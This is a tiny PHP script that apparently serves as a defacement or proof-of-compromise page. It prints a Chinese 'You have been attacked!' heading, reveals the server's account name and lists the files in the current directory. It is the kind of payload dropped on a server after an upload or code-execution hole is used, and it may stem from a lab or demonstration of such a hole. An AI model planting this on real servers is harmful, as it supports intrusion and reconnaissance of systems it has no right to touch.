<?php
echo "<h1>您已被攻擊！</h1>";
echo "您的伺服器帳號是: " . get_current_user() . "<br>";
echo "當前目錄檔案清單：<pre>";
print_r(scandir('.'));
echo "</pre>";
?>